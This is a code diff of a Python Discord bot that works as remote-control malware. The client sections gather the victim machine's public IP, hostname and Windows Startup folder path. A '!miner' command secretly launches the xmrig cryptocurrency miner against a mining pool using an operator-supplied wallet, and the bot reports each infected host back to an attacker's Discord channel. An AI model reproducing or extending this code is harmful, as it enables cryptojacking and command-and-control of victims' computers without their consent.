@@ -1,16 +1,8 @@
 from discord.ext import commands
-from discord import app_commands
-from urllib import request
-import multiprocessing
-import requests
-import discord
-import psutil
-import socket
-import sys
-import os
+import requests, discord, psutil, socket, sys, os
 
-token = '' # Token
-channel_id =  # Channel ID
+token = 'MToken.mnt.discord' # Token
+channel_id = 111111111111111111  # Channel ID
 
 # bot
 intents = discord.Intents.default()
@@ -19,10 +11,8 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 bot.remove_command('help')
 
 # client
-ip = requests.get('https://api.ipify.org').text.strip()
+ip = requests.get('https://sheesh.rip/ip').headers['IP']
 hostname = socket.gethostname()
-total_cpu = multiprocessing.cpu_count()
-hcpu = int(total_cpu / 2)
 appdata = os.getenv("AppData")
 startup = f"{appdata}\Microsoft\Windows\Start Menu\Programs\Startup"
 temp = os.getenv('temp')
@@ -72,8 +62,8 @@ async def check(ctx):
 
 # miner
 @bot.command()
-async def miner(ctx, arg1):
-    wallet = ''.join(arg1)
+async def miner(ctx, walletArg):
+    wallet = ''.join(walletArg)
     os.popen(f"xmrig.exe --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Windows -k --tls")
     await ctx.send(f"``[+] {ip}@{hostname}: Miner started``")
 
